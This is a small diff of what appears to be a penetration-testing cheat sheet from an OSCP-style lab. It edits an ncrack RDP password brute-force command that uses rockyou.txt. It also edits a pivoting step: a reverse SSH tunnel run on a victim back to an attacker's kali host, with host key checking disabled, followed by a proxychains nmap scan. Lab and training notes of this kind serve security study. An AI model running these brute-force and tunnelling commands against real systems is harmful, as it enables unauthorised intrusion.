@@ -2019,7 +2019,7 @@ c:\WINDOWS\SchedLgU.Txt
 Remote desktop
 
 ```
-ncrack -vv --user george -P /root/oscp/passwords.txt rdp://10.11.1.111
+ncrack -vv --user george -P /home/kali/rockyou.txt rdp://10.11.1.111
 ```
 
 ### Add user and enable RDP
@@ -2335,7 +2335,7 @@ Run in victim:
 
 `ssh -f -N -R 1080 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i id_rsa kali@192.168.119.137`  #Run on victim 
 
-`proxychains nmap --top-ports=20 -sT -Pn 10.1.1.68`  #Make sure "Pn" is configured when ran from kali & proxy port is in /etc/proxychains.conf file
+`proxychains nmap --top-ports=20 -sT -Pn 10.1.1.68`  #Make sure "sT" & "Pn" is configured when ran from kali & proxy port is in /etc/proxychains.conf file
 
 #Remote Port Forward:
 
